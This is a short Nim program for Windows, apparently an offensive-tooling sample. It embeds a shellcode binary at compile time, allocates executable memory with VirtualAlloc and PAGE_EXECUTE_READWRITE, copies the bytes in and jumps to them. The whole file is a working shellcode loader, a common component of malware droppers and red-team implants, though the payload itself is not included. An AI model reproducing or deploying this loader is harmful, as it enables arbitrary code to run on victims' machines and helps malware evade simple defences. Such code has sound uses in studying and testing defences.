import std/[strutils, sequtils]
import winim/lean

proc staticReadFileBytes(fileName: string): seq[char] {.compileTime.} =
    return readFile(fileName).toSeq()

proc main() =
    echo "Running shellcode..."
    var oldProtect: DWORD
    var shellcode = staticReadFileBytes("./bin/shellcode.bin")
    echo "Shellcode length: ", shellcode.len()
    let p = VirtualAlloc(NULL, shellcode.len(), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if p == NULL:
        echo "Failed to allocate memory"
        return
    copyMem(p, addr shellcode[0], shellcode.len())
    cast[proc(){.stdcall.}](p)()

main()